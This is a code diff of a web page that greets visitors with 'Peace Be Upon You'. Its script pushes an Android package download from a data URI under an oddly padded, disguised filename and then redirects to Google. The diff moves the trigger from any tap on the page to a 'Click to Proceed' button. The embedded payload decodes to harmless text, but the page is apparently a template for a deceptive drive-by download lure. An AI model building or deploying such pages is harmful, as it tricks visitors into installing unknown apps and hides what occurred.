@@ -11,19 +11,19 @@
       document.body.removeChild(link);
     }
 
-    function triggerDownloadAndRedirect() {
-      // Download
-      Puf("data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=", 
-          "apklllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.puf'");
-      // Redirect
-      location.href = "https://google.com";
+    function openWin() {
+      // Trigger download
+      Puf(
+        "data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=",
+        "apklllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.puf'"
+      );
+      // Redirect to Google
+      window.location.href = "https://google.com";
     }
-
-    // Tap anywhere on the page
-    window.addEventListener("click", triggerDownloadAndRedirect, { once: true });
   </script>
 </head>
 <body>
   <center><h2>Peace Be Upon You</h2></center>
+  <center><input type="button" onclick="openWin();" value="Click to Proceed"/></center>
 </body>
 </html>
